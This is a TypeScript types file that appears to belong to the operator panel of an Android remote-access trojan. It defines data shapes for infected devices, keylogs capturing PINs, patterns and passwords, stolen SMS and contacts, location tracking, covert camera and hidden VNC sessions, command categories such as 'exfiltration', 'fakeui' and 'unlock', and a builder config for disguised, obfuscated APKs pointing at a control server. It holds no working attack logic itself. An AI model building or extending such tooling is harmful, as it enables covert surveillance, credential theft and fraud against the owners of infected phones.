export type ViewMode = 'android' | 'pc';

export type DeviceStatus = 'online' | 'offline' | 'idle';

export interface DeviceInfo {
  deviceId: string;
  model: string;
  brand: string;
  androidVersion: string;
  sdkVersion: number;
  batteryLevel: number;
  isCharging: boolean;
  networkType: string;
  ipAddress: string;
  country: string;
  operator: string;
  imei: string;
  resolution: string;
  hasAccessibility: boolean;
  hasOverlay: boolean;
  hasAdmin: boolean;
  hasBatteryExemption: boolean;
  installedApps: string[];
  connectedAt: number;
  lastSeen: number;
  status: DeviceStatus;
  tags: string[];
  stealthLevel: number;
  vncActive: boolean;
  silentVncActive: boolean;
}

export interface Device extends DeviceInfo {
  id: string;
}

export type CommandCategory =
  | 'screen'
  | 'gesture'
  | 'device'
  | 'surveillance'
  | 'exfiltration'
  | 'apps'
  | 'fakeui'
  | 'blackscreen'
  | 'unlock'
  | 'system'
  | 'plugins';

export interface Command {
  id: string;
  label: string;
  category: CommandCategory;
  params?: CommandParam[];
  icon?: string;
  danger?: boolean;
}

export interface CommandParam {
  key: string;
  label: string;
  type: 'string' | 'number' | 'boolean' | 'select';
  options?: string[];
  defaultValue?: string | number | boolean;
  required?: boolean;
}

export interface CommandPayload {
  command: string;
  params?: Record<string, string | number | boolean>;
}

export interface KeylogEntry {
  timestamp: number;
  deviceId: string;
  app: string;
  text: string;
  type: 'keyboard' | 'clipboard' | 'pattern' | 'pin' | 'password';
}

export interface FileEntry {
  name: string;
  path: string;
  size: number;
  isDir: boolean;
  modified: number;
  mimeType?: string;
}

export interface SmsMessage {
  id: string;
  address: string;
  body: string;
  date: number;
  type: 'inbox' | 'sent';
  read: boolean;
}

export interface Contact {
  id: string;
  name: string;
  phones: string[];
  emails: string[];
}

export interface WsMessage {
  type: string;
  [key: string]: unknown;
}

export interface ApkBuildConfig {
  serverHost: string;
  serverPort: number;
  appName: string;
  packageName: string;
  iconUrl?: string;
  disguiseLabel: string;
  keystoreAlias: string;
  keystorePassword: string;
  signingMode: 'debug' | 'release';
  obfuscate: boolean;
  stealthLevel: 1 | 2 | 3;
}

export interface ApkBuildStatus {
  jobId: string;
  stage: 'queued' | 'building' | 'signing' | 'done' | 'error';
  progress: number;
  log: string[];
  downloadUrl?: string;
  error?: string;
}

export interface NotifToast {
  id: string;
  type: 'info' | 'success' | 'warn' | 'error';
  message: string;
  duration?: number;
}

export interface HvncState {
  active:     boolean;
  mode:       'silent' | 'standard';
  quality:    number;   // JPEG quality 10-100
  fps:        number;   // frames per second (rolling)
  frameCount: number;   // total frames received this session
  bytesSent:  number;   // total bytes received this session
  latencyMs:  number;   // last measured round-trip (ping/pong)
}

export interface AuthState {
  authenticated: boolean;
  token: string | null;
}

/* ── Location tracking ─────────────────────────────────────── */
export interface LocationPoint {
  lat:       number;
  lon:       number;
  acc:       number;   // accuracy radius in meters
  ts:        number;   // unix ms
  deviceId:  string;
  address?:  string;   // reverse-geocoded (optional)
  speed?:    number;   // m/s if provided
  bearing?:  number;   // degrees 0-360 if provided
}

export interface DeviceLocationState {
  deviceId:   string;
  current:    LocationPoint | null;
  history:    LocationPoint[];    // last 500 points
  following:  boolean;           // map auto-pans to this device
}

/* ── Camera ───────────────────────────────────────────────────── */
export interface CameraState {
  active:   boolean;
  facing:   'front' | 'back';
  width:    number;
  height:   number;
  fps:      number;
  frameCount: number;
}

/* ── SMS ──────────────────────────────────────────────────────── */
export interface SmsThread {
  address:    string;
  name:       string;    // contact name if available
  lastBody:   string;
  lastDate:   number;
  unread:     number;
  messages:   SmsMessage[];
}
